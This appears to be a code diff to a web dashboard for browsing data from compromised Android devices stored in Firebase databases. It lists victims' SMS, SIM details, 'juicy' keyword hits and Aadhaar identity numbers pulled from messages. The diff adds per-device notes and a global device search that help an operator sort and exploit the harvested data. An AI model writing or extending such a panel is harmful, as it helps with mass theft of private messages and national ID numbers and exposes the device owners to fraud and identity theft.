@@ -169,7 +169,7 @@
             <th>Oldest SMS</th>
             <th>Newest SMS</th>
             <th>Juicy</th>
-            <th>IDs Found</th>
+            <th>Notes</th>
             <th>SMS</th>
           </tr>
         </thead>
@@ -195,6 +195,26 @@
     <h3 id="searchaadhar-title">🪪 Aadhaar Numbers in SMS</h3>
     <div id="searchaadhar-body"><div class="loading"><div class="spinner"></div><br>Fetching SMS…</div></div>
   </div>
+</div>
+
+<!-- ── Notes Modal ── -->
+<div class="modal-overlay" id="notes-modal" onclick="if(event.target===this)closeNotes()">
+  <div class="modal-box" style="max-width:520px">
+    <button class="modal-close" onclick="closeNotes()">✕ Close</button>
+    <h3 id="notes-title">📝 Device Notes</h3>
+    <textarea id="notes-textarea" style="width:100%;height:200px;margin-top:12px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);padding:10px;font-size:13px;resize:vertical" placeholder="Add notes about this device…"></textarea>
+    <div style="margin-top:10px;display:flex;gap:8px">
+      <button class="btn" onclick="saveNotes()">💾 Save</button>
+      <button class="btn btn-ghost" onclick="closeNotes()">Cancel</button>
+      <span id="notes-status" style="color:var(--green);font-size:12px;align-self:center"></span>
+    </div>
+  </div>
+</div>
+
+<!-- ── Device search results (global) ── -->
+<div id="device-search-results" style="display:none;padding:16px 20px">
+  <div style="color:var(--muted);font-size:13px;margin-bottom:12px" id="device-search-info"></div>
+  <div id="device-search-grid"></div>
 </div>
 
 <script>
@@ -323,7 +343,18 @@ function renderUrls(urls) {
   }).join('');
 }
 
-document.getElementById('search-input').addEventListener('input', () => renderUrls(allUrls));
+document.getElementById('search-input').addEventListener('input', async () => {
+  const q = document.getElementById('search-input').value.trim();
+  // If query looks like a device ID (hex chars, ≥8 chars), do global device search
+  if (/^[0-9a-f]{8,}$/i.test(q)) {
+    await searchDeviceGlobal(q);
+  } else {
+    document.getElementById('device-search-results').style.display = 'none';
+    document.getElementById('url-grid').style.display = '';
+    document.getElementById('sort-bar').style.display = '';
+    renderUrls(allUrls);
+  }
+});
 
 // ── Open URL devices ──────────────────────────────────────────────────────────
 async function openUrl(id) {
@@ -423,7 +454,7 @@ function renderDevices() {
       <td style="color:var(--muted);font-size:12px">${d.lastActivity || '—'}</td>
       <td style="color:var(--muted);font-size:12px">${d.lastActivity || '—'}</td>
       <td>${kwHtml}</td>
-      <td>${idsHtml}</td>
+      <td><button class="sms-btn" onclick="openNotes(event,${currentUrlId},'${d.deviceId}')">📝</button></td>
       <td><a class="sms-btn" href="${d.smsLink}" target="_blank">📥 SMS</a>
           <button class="sms-btn" style="margin-left:4px" onclick="openSearchno(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">📞</button>
           <button class="sms-btn" style="margin-left:4px" onclick="openSearchaadhar(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">🪪</button></td>
@@ -522,6 +553,7 @@ async function openSearchaadhar(evt, urlId, deviceId, brand) {
         <div class="hit-card">
           <div class="hit-phones">
             ${h.aadhars.map(a => `<span class="phone-chip" style="background:rgba(34,197,94,.12);color:var(--green)">${a}</span>`).join('')}
+            ${h.hasKeyword && !h.aadhars.length ? `<span class="phone-chip" style="background:rgba(245,158,11,.12);color:var(--yellow)">🔑 aadhaar keyword</span>` : ''}
           </div>
           <div class="hit-body">${esc(h.body.slice(0, 300))}${h.body.length > 300 ? '…' : ''}</div>
         </div>
@@ -529,6 +561,90 @@ async function openSearchaadhar(evt, urlId, deviceId, brand) {
     `;
   } catch (e) {
     body.innerHTML = `<p style="color:var(--red)">Failed to fetch: ${e.message}</p>`;
+  }
+}
+
+// ── Notes Modal ──────────────────────────────────────────────────────────────
+let _notesUrlId = 0, _notesDeviceId = '';
+
+function closeNotes() {
+  document.getElementById('notes-modal').classList.remove('open');
+}
+
+async function openNotes(evt, urlId, deviceId) {
+  evt.stopPropagation();
+  _notesUrlId = urlId; _notesDeviceId = deviceId;
+  document.getElementById('notes-title').textContent = `📝 Notes — ${deviceId.slice(0,20)}`;
+  document.getElementById('notes-status').textContent = '';
+  document.getElementById('notes-textarea').value = 'Loading…';
+  document.getElementById('notes-modal').classList.add('open');
+  try {
+    const r = await fetch(`/api/notes/${urlId}/${encodeURIComponent(deviceId)}`);
+    const d = await r.json();
+    document.getElementById('notes-textarea').value = d.note || '';
+  } catch { document.getElementById('notes-textarea').value = ''; }
+}
+
+async function saveNotes() {
+  const note = document.getElementById('notes-textarea').value;
+  try {
+    await fetch(`/api/notes/${_notesUrlId}/${encodeURIComponent(_notesDeviceId)}`,
+      { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({note}) });
+    document.getElementById('notes-status').textContent = '✅ Saved!';
+    setTimeout(() => document.getElementById('notes-status').textContent = '', 2000);
+  } catch { document.getElementById('notes-status').textContent = '❌ Error'; }
+}
+
+// ── Global Device Search ──────────────────────────────────────────────────────
+async function searchDeviceGlobal(q) {
+  // Hide URL grid, show results panel
+  document.getElementById('url-grid').style.display = 'none';
+  document.getElementById('sort-bar').style.display = 'none';
+  const panel = document.getElementById('device-search-results');
+  const info  = document.getElementById('device-search-info');
+  const grid  = document.getElementById('device-search-grid');
+  panel.style.display = 'block';
+  info.textContent = `🔍 Searching for device "${q}" across all URLs…`;
+  grid.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
+
+  try {
+    const res  = await fetch(`/api/search/device/${encodeURIComponent(q)}`);
+    const data = await res.json();
+    if (!data.results.length) {
+      info.textContent = `🔍 No devices found matching "${q}"`;
+      grid.innerHTML = '';
+      return;
+    }
+    info.textContent = `🔍 Found ${data.results.length} device(s) matching "${q}"`;
+    const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    grid.innerHTML = data.results.map(d => `
+      <div class="url-card" style="cursor:default;margin-bottom:8px">
+        <div class="url-card-header">
+          <span class="url-id" style="font-size:14px">#${d.urlId}</span>
+          <span class="url-host">${d.url.replace('https://','').replace('-default-rtdb.firebaseio.com','')}</span>
+          <span class="badge-sm ${d.status==='online'?'badge-green':'badge-red'}" style="margin-left:auto">${d.status}</span>
+        </div>
+        <div style="font-size:12px;color:var(--muted);margin:4px 0">
+          <code style="color:var(--text)">${esc(d.deviceId)}</code>
+        </div>
+        <div class="url-metrics">
+          <div class="metric"><div class="k">Brand</div><div class="v" style="font-size:12px">${esc(d.brand)}</div></div>
+          <div class="metric"><div class="k">Battery</div><div class="v" style="font-size:12px">${esc(d.battery)}</div></div>
+          <div class="metric"><div class="k">SIM1</div><div class="v" style="font-size:12px">${esc(d.sim1)}</div></div>
+          <div class="metric"><div class="k">Last Act.</div><div class="v" style="font-size:12px">${d.lastActivity||'—'}</div></div>
+        </div>
+        ${d.juicyKeywords.length ? `<div class="tag-juicy" style="margin-top:6px">🎯 ${d.juicyKeywords.join(', ')}</div>` : ''}
+        <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
+          <a class="sms-btn" href="${esc(d.smsLink)}" target="_blank">📥 SMS</a>
+          <button class="sms-btn" onclick="openUrl(${d.urlId})">👁️ View URL</button>
+          <button class="sms-btn" onclick="openSearchno(event,${d.urlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">📞</button>
+          <button class="sms-btn" onclick="openSearchaadhar(event,${d.urlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">🪪</button>
+          <button class="sms-btn" onclick="openNotes(event,${d.urlId},'${d.deviceId}')">📝</button>
+        </div>
+      </div>`).join('');
+  } catch (e) {
+    info.textContent = `❌ Search error: ${e.message}`;
+    grid.innerHTML = '';
   }
 }
 
